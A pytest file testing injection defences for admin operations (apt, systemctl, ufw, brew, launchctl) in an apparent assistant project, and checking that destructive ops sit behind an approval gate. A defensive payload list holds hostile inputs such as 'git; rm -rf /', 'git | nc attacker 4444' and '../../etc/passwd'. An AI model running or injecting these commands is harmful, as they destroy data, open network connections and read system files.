"""Cross-platform admin op vocabulary tests (Wave-3 sub-task 3.3, AD-12).

Two security invariants are exercised here:

1. **Pattern-validated argv only.** Every op accepts a good payload and rejects
   an injection payload (e.g. ``package="git; rm -rf /"`` must fail the regex
   *before* the executor builds any argv). This is the first injection defense;
   the ``shell=False`` + list-argv contract in ``executor.py`` is the second.
2. **Destructive ops are gated.** Every destructive Unix op is registered in
   ``schema.DESTRUCTIVE_OPS`` so the per-action approval gate (`client.py`)
   fires identically across OSes.

The executor argv-builder tests use the same ``_SubprocessRecorder`` pattern as
``test_executor_winget.py`` (no real subprocess, no ``unittest.mock`` — EK-3).
"""
from __future__ import annotations

import pytest
from pydantic import TypeAdapter, ValidationError

from jarvis.admin.executor import AdminExecutor
from jarvis.admin.schema import (
    ADMIN_OPERATION_TYPES,
    DESTRUCTIVE_OPS,
    AdminOperation,
)
from jarvis.admin.schema_unix import (
    UNIX_ADMIN_OPERATION_TYPES,
    UNIX_DESTRUCTIVE_OPS,
    AptInstallOp,
    AptRemoveOp,
    BrewInstallOp,
    BrewRemoveOp,
    LaunchctlOp,
    SystemctlOp,
    UfwRemoveOp,
    UfwRuleOp,
)

# ---------------------------------------------------------------------
# Injection payloads — must be rejected by every string field's regex
# ---------------------------------------------------------------------

_INJECTION_PAYLOADS = [
    "git; rm -rf /",
    "git && rm -rf /",
    "git | nc attacker 4444",
    "$(rm -rf /)",
    "`rm -rf /`",
    "git\nrm -rf /",
    "../../etc/passwd",
    "git ; whoami",
    "git`whoami`",
    "git$(whoami)",
    "git&whoami",
    "git>out",
    "git<in",
    "git'quote",
    'git"quote',
    "git\\backslash",
    "git/slash",
    "git package",  # space
]


# =====================================================================
# Linux — apt
# =====================================================================

class TestAptInstall:
    def test_good_payload_validates(self) -> None:
        op = AptInstallOp(package="git")
        assert op.package == "git"
        assert op.type == "apt_install"

    @pytest.mark.parametrize(
        "package",
        ["git", "python3", "lib32z1", "g++", "ca-certificates",
         "linux-image-amd64", "x11-apps", "0ad"],
    )
    def test_valid_debian_package_names(self, package: str) -> None:
        assert AptInstallOp(package=package).package == package

    @pytest.mark.parametrize("payload", _INJECTION_PAYLOADS)
    def test_injection_rejected(self, payload: str) -> None:
        with pytest.raises(ValidationError):
            AptInstallOp(package=payload)

    def test_empty_rejected(self) -> None:
        with pytest.raises(ValidationError):
            AptInstallOp(package="")

    def test_uppercase_rejected(self) -> None:
        # Debian package names are lowercase; uppercase must not match.
        with pytest.raises(ValidationError):
            AptInstallOp(package="GIT")

    def test_extra_field_forbidden(self) -> None:
        with pytest.raises(ValidationError):
            AptInstallOp(package="git", evil="x")  # type: ignore[call-arg]

    def test_frozen(self) -> None:
        op = AptInstallOp(package="git")
        with pytest.raises(ValidationError):
            op.package = "vim"  # type: ignore[misc]


class TestAptRemove:
    def test_good_payload(self) -> None:
        assert AptRemoveOp(package="git").type == "apt_remove"

    @pytest.mark.parametrize("payload", _INJECTION_PAYLOADS)
    def test_injection_rejected(self, payload: str) -> None:
        with pytest.raises(ValidationError):
            AptRemoveOp(package=payload)


# =====================================================================
# Linux — systemctl
# =====================================================================

class TestSystemctl:
    @pytest.mark.parametrize(
        "action", ["start", "stop", "enable", "disable", "restart"]
    )
    def test_valid_actions(self, action: str) -> None:
        op = SystemctlOp(action=action, unit="nginx.service")
        assert op.action == action

    @pytest.mark.parametrize(
        "unit",
        ["nginx", "ssh.service", "getty@tty1.service", "my-app.timer",
         "systemd-resolved.service"],
    )
    def test_valid_units(self, unit: str) -> None:
        assert SystemctlOp(action="start", unit=unit).unit == unit

    def test_invalid_action_rejected(self) -> None:
        with pytest.raises(ValidationError):
            SystemctlOp(action="nuke", unit="nginx")  # type: ignore[arg-type]

    @pytest.mark.parametrize("payload", _INJECTION_PAYLOADS)
    def test_injection_in_unit_rejected(self, payload: str) -> None:
        with pytest.raises(ValidationError):
            SystemctlOp(action="start", unit=payload)

    def test_extra_field_forbidden(self) -> None:
        with pytest.raises(ValidationError):
            SystemctlOp(action="start", unit="nginx", evil="x")  # type: ignore[call-arg]


# =====================================================================
# Linux — ufw
# =====================================================================

class TestUfwRule:
    def test_good_payload(self) -> None:
        op = UfwRuleOp(action="allow", port=8080, proto="tcp")
        assert op.port == 8080
        assert op.proto == "tcp"

    @pytest.mark.parametrize("port", [1, 22, 8080, 65535])
    def test_valid_ports(self, port: int) -> None:
        assert UfwRuleOp(port=port).port == port

    @pytest.mark.parametrize("port", [0, -1, 65536, 100000])
    def test_out_of_range_port_rejected(self, port: int) -> None:
        with pytest.raises(ValidationError):
            UfwRuleOp(port=port)

    def test_invalid_proto_rejected(self) -> None:
        with pytest.raises(ValidationError):
            UfwRuleOp(port=80, proto="icmp")  # type: ignore[arg-type]

    def test_invalid_action_rejected(self) -> None:
        with pytest.raises(ValidationError):
            UfwRuleOp(port=80, action="reject")  # type: ignore[arg-type]

    def test_string_injection_in_port_rejected(self) -> None:
        # A port must be an int; a shell-string cannot smuggle in.
        with pytest.raises(ValidationError):
            UfwRuleOp(port="80; rm -rf /")  # type: ignore[arg-type]


class TestUfwRemove:
    def test_good_payload(self) -> None:
        assert UfwRemoveOp(action="deny", port=22, proto="udp").type == "ufw_remove"


# =====================================================================
# macOS — brew
# =====================================================================

class TestBrewInstall:
    def test_good_payload(self) -> None:
        assert BrewInstallOp(formula="wget").formula == "wget"

    @pytest.mark.parametrize(
        "formula", ["wget", "python@3.11", "node", "gcc@13", "ffmpeg", "go"]
    )
    def test_valid_formulae(self, formula: str) -> None:
        assert BrewInstallOp(formula=formula).formula == formula

    @pytest.mark.parametrize("payload", _INJECTION_PAYLOADS)
    def test_injection_rejected(self, payload: str) -> None:
        with pytest.raises(ValidationError):
            BrewInstallOp(formula=payload)

    def test_extra_field_forbidden(self) -> None:
        with pytest.raises(ValidationError):
            BrewInstallOp(formula="wget", evil="x")  # type: ignore[call-arg]


class TestBrewRemove:
    def test_good_payload(self) -> None:
        assert BrewRemoveOp(formula="wget").type == "brew_remove"

    @pytest.mark.parametrize("payload", _INJECTION_PAYLOADS)
    def test_injection_rejected(self, payload: str) -> None:
        with pytest.raises(ValidationError):
            BrewRemoveOp(formula=payload)


# =====================================================================
# macOS — launchctl
# =====================================================================

class TestLaunchctl:
    @pytest.mark.parametrize("action", ["load", "unload", "enable", "disable"])
    def test_valid_actions(self, action: str) -> None:
        op = LaunchctlOp(action=action, label="com.apple.Spotlight")
        assert op.action == action

    @pytest.mark.parametrize(
        "label", ["com.apple.Spotlight", "org.jarvis.helper", "io.foo.bar-baz"]
    )
    def test_valid_labels(self, label: str) -> None:
        assert LaunchctlOp(action="load", label=label).label == label

    def test_invalid_action_rejected(self) -> None:
        with pytest.raises(ValidationError):
            LaunchctlOp(action="start", label="com.apple.x")  # type: ignore[arg-type]

    @pytest.mark.parametrize("payload", _INJECTION_PAYLOADS)
    def test_injection_in_label_rejected(self, payload: str) -> None:
        with pytest.raises(ValidationError):
            LaunchctlOp(action="load", label=payload)


# =====================================================================
# Superset wiring — union, types, destructive-ops registry
# =====================================================================

class TestSchemaSuperset:
    def test_unix_types_in_admin_operation_types(self) -> None:
        for t in UNIX_ADMIN_OPERATION_TYPES:
            assert t in ADMIN_OPERATION_TYPES

    def test_unix_destructive_ops_registered(self) -> None:
        # Every destructive Unix op must be in the global DESTRUCTIVE_OPS so the
        # approval gate fires identically across OSes.
        for op_type in UNIX_DESTRUCTIVE_OPS:
            assert op_type in DESTRUCTIVE_OPS

    def test_specific_destructive_ops_present(self) -> None:
        for op_type in ("apt_remove", "brew_remove", "ufw_remove",
                        "systemctl", "launchctl", "write_protected_path"):
            assert op_type in DESTRUCTIVE_OPS

    def test_non_destructive_unix_ops_not_gated(self) -> None:
        # Pure-additive installs/queries should not require approval.
        for op_type in ("apt_install", "brew_install", "ufw_rule"):
            assert op_type not in DESTRUCTIVE_OPS

    @pytest.mark.parametrize(
        "payload,expected",
        [
            ({"type": "apt_install", "package": "git"}, AptInstallOp),
            ({"type": "apt_remove", "package": "git"}, AptRemoveOp),
            ({"type": "systemctl", "action": "restart", "unit": "nginx"},
             SystemctlOp),
            ({"type": "ufw_rule", "port": 8080, "proto": "tcp",
              "action": "allow"}, UfwRuleOp),
            ({"type": "ufw_remove", "port": 22, "proto": "udp",
              "action": "deny"}, UfwRemoveOp),
            ({"type": "brew_install", "formula": "wget"}, BrewInstallOp),
            ({"type": "brew_remove", "formula": "wget"}, BrewRemoveOp),
            ({"type": "launchctl", "action": "load",
              "label": "com.apple.x"}, LaunchctlOp),
        ],
    )
    def test_discriminated_union_parses_unix_ops(
        self, payload: dict, expected: type
    ) -> None:
        """The helper decode path (TypeAdapter on the superset union) parses
        every Unix op from a JSON-ish dict by its ``type`` discriminator."""
        ta = TypeAdapter(AdminOperation)
        op = ta.validate_python(payload)
        assert isinstance(op, expected)

    def test_union_rejects_injection_through_decode_path(self) -> None:
        ta = TypeAdapter(AdminOperation)
        with pytest.raises(ValidationError):
            ta.validate_python({"type": "apt_install", "package": "git; whoami"})


# =====================================================================
# Executor argv builders — list-argv only, never shell=True
# =====================================================================

class _SubprocessRecorder:
    """Replacement for ``AdminExecutor._run_subprocess`` (no real subprocess)."""

    def __init__(self, scripted: list[tuple[int, str, str]] | None = None) -> None:
        self.calls: list[tuple[tuple[str, ...], int]] = []
        self.scripted = scripted or [(0, "OK", "")]

    async def __call__(self, argv, *, timeout_s):
        self.calls.append((tuple(argv), timeout_s))
        if self.scripted:
            return self.scripted.pop(0)
        return 0, "", ""


def _no_shell_meta(argv: tuple[str, ...]) -> None:
    """Assert no argv segment carries a shell metacharacter."""
    for a in argv:
        for meta in (";", "&&", "|", "$(", "`", "\n", ">", "<", "&"):
            assert meta not in a, f"shell metachar {meta!r} in argv segment {a!r}"


class TestExecutorArgvBuilders:
    @pytest.mark.asyncio
    async def test_apt_install_argv(self) -> None:
        rec = _SubprocessRecorder()
        ex = AdminExecutor()
        ex._run_subprocess = rec  # type: ignore[assignment]
        resp = await ex.execute(AptInstallOp(package="git"))
        assert resp.success
        argv, _ = rec.calls[0]
        assert argv == ("apt-get", "install", "-y", "git")
        _no_shell_meta(argv)

    @pytest.mark.asyncio
    async def test_apt_remove_argv(self) -> None:
        rec = _SubprocessRecorder()
        ex = AdminExecutor()
        ex._run_subprocess = rec  # type: ignore[assignment]
        await ex.execute(AptRemoveOp(package="git"))
        argv, _ = rec.calls[0]
        assert argv == ("apt-get", "remove", "-y", "git")
        _no_shell_meta(argv)

    @pytest.mark.asyncio
    async def test_systemctl_argv(self) -> None:
        rec = _SubprocessRecorder()
        ex = AdminExecutor()
        ex._run_subprocess = rec  # type: ignore[assignment]
        await ex.execute(SystemctlOp(action="restart", unit="nginx.service"))
        argv, _ = rec.calls[0]
        assert argv == ("systemctl", "restart", "nginx.service")
        _no_shell_meta(argv)

    @pytest.mark.asyncio
    async def test_ufw_rule_argv(self) -> None:
        rec = _SubprocessRecorder()
        ex = AdminExecutor()
        ex._run_subprocess = rec  # type: ignore[assignment]
        await ex.execute(UfwRuleOp(action="allow", port=8080, proto="tcp"))
        argv, _ = rec.calls[0]
        assert argv == ("ufw", "allow", "8080/tcp")
        _no_shell_meta(argv)

    @pytest.mark.asyncio
    async def test_ufw_remove_argv(self) -> None:
        rec = _SubprocessRecorder()
        ex = AdminExecutor()
        ex._run_subprocess = rec  # type: ignore[assignment]
        await ex.execute(UfwRemoveOp(action="deny", port=22, proto="udp"))
        argv, _ = rec.calls[0]
        assert argv == ("ufw", "delete", "deny", "22/udp")
        _no_shell_meta(argv)

    @pytest.mark.asyncio
    async def test_brew_install_argv(self) -> None:
        rec = _SubprocessRecorder()
        ex = AdminExecutor()
        ex._run_subprocess = rec  # type: ignore[assignment]
        await ex.execute(BrewInstallOp(formula="wget"))
        argv, _ = rec.calls[0]
        assert argv == ("brew", "install", "wget")
        _no_shell_meta(argv)

    @pytest.mark.asyncio
    async def test_brew_remove_argv(self) -> None:
        rec = _SubprocessRecorder()
        ex = AdminExecutor()
        ex._run_subprocess = rec  # type: ignore[assignment]
        await ex.execute(BrewRemoveOp(formula="wget"))
        argv, _ = rec.calls[0]
        assert argv == ("brew", "uninstall", "wget")
        _no_shell_meta(argv)

    @pytest.mark.asyncio
    async def test_launchctl_argv(self) -> None:
        rec = _SubprocessRecorder()
        ex = AdminExecutor()
        ex._run_subprocess = rec  # type: ignore[assignment]
        await ex.execute(LaunchctlOp(action="unload", label="com.apple.Spotlight"))
        argv, _ = rec.calls[0]
        assert argv == ("launchctl", "unload", "com.apple.Spotlight")
        _no_shell_meta(argv)

    @pytest.mark.asyncio
    async def test_non_zero_exit_is_failure(self) -> None:
        rec = _SubprocessRecorder(scripted=[(100, "", "E: package not found")])
        ex = AdminExecutor()
        ex._run_subprocess = rec  # type: ignore[assignment]
        resp = await ex.execute(AptInstallOp(package="nonexistent"))
        assert resp.success is False
        assert resp.error_code == "apt_install_failed"
